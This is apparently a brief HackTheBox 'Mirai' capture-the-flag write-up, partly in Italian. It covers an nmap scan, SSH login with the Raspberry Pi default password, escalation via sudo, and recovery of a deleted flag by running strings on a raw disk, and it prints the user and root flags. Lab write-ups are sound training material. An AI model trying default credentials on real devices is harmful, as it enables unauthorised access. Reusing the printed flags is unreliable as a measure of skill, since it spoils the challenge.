![](mirai.png)
#Mirai -HackTheBox Writeup

##Nmap Scan
```bash
nmap -sCV -O ip target
```
##aggiunta ip etc/hosts

##scansione directory
/admin (trovata con dirbuster)

##pi hole
```bash 
ssh pi@iptarget
password raspberry
```
#User Flag
user: ff837707441b257a20e32199d7c8838d
#Root Flag
```bash
sudo su
cd root
I lost my original root.txt! I think I may have a backup on my USB stick...
scp pi@10.129.4.35:/media/usbstick/damnit.txt .(copia file sulla nostra macchina)
sudo strings /dev/sdb(ricostruzione file)
```
#Flag 
3d3e483143ff12ec505d026fa13e020b